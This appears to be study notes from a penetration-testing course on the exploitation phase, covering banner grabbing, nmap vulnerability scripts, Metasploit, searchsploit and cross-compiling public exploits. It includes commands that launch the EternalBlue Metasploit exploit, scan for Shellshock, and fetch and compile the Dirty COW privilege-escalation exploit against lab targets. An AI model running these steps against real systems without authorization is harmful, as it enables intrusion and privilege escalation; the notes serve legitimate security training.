# Exploitation

## [Exploitation](http://www.pentest-standard.org/index.php/Exploitation) Introduction <a href="#exploitation-introduction" id="exploitation-introduction"></a>

üóíÔ∏è **Exploitation** is a phase of a penetration test that focuses on establishing access, _initial foothold_, to a system or resource by bypassing security restrictions.

With a proper vulnerability analysis, the exploitation attack vector should focus on the success probability and the high value target assets with the highest impact on the scanned organization.

* _The use of automated exploitation tools (Metasploit, Powershell Empire, etc) shouldn't be prevalent_
* Exploitation methodology:
  * Identify Vulnerable Services
  * Prepare Exploit Code
  * Gaining Remote access
  * Bypass AV detection
  * Pivoting

***

## Vulnerability Scanning <a href="#vulnerability-scanning" id="vulnerability-scanning"></a>

* Identify running and vulnerable services

### [Banner Grabbing](https://cyberexperts.com/encyclopedia/banner-grabbing/) <a href="#banner-grabbing" id="banner-grabbing"></a>

üóíÔ∏è **Banner grabbing** is the info gathering manual or automatic process used to obtain software and services name and version. The host server displays a text with this information as a _banner_.

Tools and techniques:

* `nmap` service version detection scan
* `Netcat` connection
* Authentication with a supported service
* `curl` / `wget` to get headers details of an HTTP server

> üî¨ Check the [SSH Enumeration Lab here](../../assessment-methodologies/enumeration/ssh-enum/ssh-recon-basic.md)

Some useful commands from the lab environment:

* `nmap`

```bash
nmap -sV -O <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```bash
ls -al /usr/share/nmap/scripts/ | grep banner
    -rw-r--r-- 1 root root  6129 Jan  9  2019 banner.nse
    
nmap -sV --script=banner.nse <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* `nc` / `netcat`

```bash
# e.g.
nc <TARGET_IP> <TARGET_OPEN_PORT>

nc 192.67.58.3 22                      
    SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6
```

* SSH Authentication

```bash
ssh root@<TARGET_IP>
	Welcome to attack defense ssh recon lab!! # SSH Welcome Banner
```

### [Nmap Scripts](https://nmap.org/book/nse) <a href="#nmap-scripts" id="nmap-scripts"></a>

üóíÔ∏è **Nmap Engine Scripting** (**NSE**) - an `nmap` feature that allows to write simple scripts to automate a wide variety of tasks, like:

* network discovery
* sophisticated version detection
* vulnerability detection and exploitation
* backdoor detection

Scripts are written using the **Lua** programming language.

Nmap script default directory is:

* `/usr/share/nmap/scripts`

```bash
ls -al /usr/share/nmap/scripts | grep <keyword>
```

> üî¨ Check the [Bash - ShellShock Lab here](../system-host-based-attack/linux-operating-system/bash.md)

* Some useful commands and `nmap` script scan from the lab environment:

```bash
nmap -sV -O <TARGET_IP>
```

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sV -p 80 --script=http-enum <TARGET_IP>

ls -al /usr/share/nmap/scripts | grep shellshock
    -rw-r--r-- 1 root root  5551 Jan  9  2019 http-shellshock.nse

nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>

# Vulnerable to the CVE-2014-6271
```

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### [Metasploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) <a href="#metasploit" id="metasploit"></a>

Focus on the techniques and the flow to detect vulnerabilities.

> üî¨ Home Lab based on a Windows 7/2008 R2 target vulnerable to EternalBlue SMB RCE. Check the[ Lab 2 here](../system-host-based-attack/windows-operating-system/smb.md)

```bash
sudo nmap -sS -sV <TARGET_IP>
```

```bash
searchsploit EternalBlue
searchsploit ms17-010
```

```bash
# Check the vulnerability with a scanner, before trying to exploit it
msfconsole

search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run  
```

***

## Searching for Exploits <a href="#searching-for-exploits" id="searching-for-exploits"></a>

Exploit code can be found online or inside locally-stored exploit database in pentest Linux distributions (`searchsploit`, MSF).

**Verifiable online sources**:

* [exploit-db.com](https://www.exploit-db.com/)
  * always check for the **Verified** column
  * use search filters
  * [Dorks - Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
* [Rapid7 db](https://www.rapid7.com/db/)

> ‚ùó **Always pay attention at publicly available exploits. An exploit can be weaponized to attack the actual attacker system!**
>
> üìå Analyze the exploit code behavior to ensure that it works as intended.

### [Searchsploit](https://www.exploit-db.com/searchsploit) <a href="#searchsploit" id="searchsploit"></a>

üóíÔ∏è **`searchsploit`** - command line search tool for Exploit-Db that allows to have an offline copy of the Exploit-Db.

* Useful for security assessments on networks without Internet access
* Pre-packed with Kali Linux
* `exploitdb` local directory is:
  * `/usr/share/exploitdb`

```bash
# Debian-based distro install
sudo apt update && sudo apt -y install exploitdb
```

```bash
ls -al /usr/share/exploitdb

# Update the exploitdb package updates
searchsploit -u
```

```bash
searchsploit [options] <term>
searchsploit vsftpd 2.3.4

# Copy an exploit to the current working dir
searchsploit -m 49757    

# Case sensitive search
searchsploit -c OpenSSH

# Search just the exploit title
searchsploit -t vsftpd

# Exact search on title
searchsploit -e "Windows 7"

# Filters search
searchsploit remote windows smb
searchsploit remote linux ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit local windows
searchsploit local windows | grep -e "Microsoft"

# List online links
searchsploit -w remote windows smb | grep -e "EternalBlue"
```

***

## Fixing Exploits <a href="#fixing-exploits" id="fixing-exploits"></a>

> üî¨ Check the [Fixing Exploits Lab here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/4-exploitation/fix-exp)

### Cross-Compiling Exploits <a href="#cross-compiling-exploits" id="cross-compiling-exploits"></a>

Exploit code developed in `C`, `C++`, `C#` has to be compiled into a portable executable or binary.

üóíÔ∏è **Cross-compilation** is the process of building on one platform a binary that will run on another platform.

* Compiling `C` code is a necessary skill

> üìå [ExploitDB bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits) - **useful for pre-compiled binaries**

**`e.g.`** of Windows and Linux exploit code compiling

* [VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow](https://www.exploit-db.com/exploits/9303)
* [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

#### Tools:

* [**MinGW-w64**](https://www.mingw-w64.org/)

```
sudo apt -y install mingw-w64 gcc
```

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands

```bash
# Compile for x64
x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe

# Compile for x86 (32-bit)
i686-w64-mingw32-gcc 9303.c -o exploit32.exe
```

<figure><img src="../../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

**Linux**

* Download the DirtyCow exploit or use `searchsploit`

```bash
searchsploit Dirty Cow
searchsploit -m 40839
```

<figure><img src="../../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands to compile it successfully

```bash
# Compile with
gcc -pthread 40839.c -o dirty_exploit -lcrypt
```

<figure><img src="../../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>





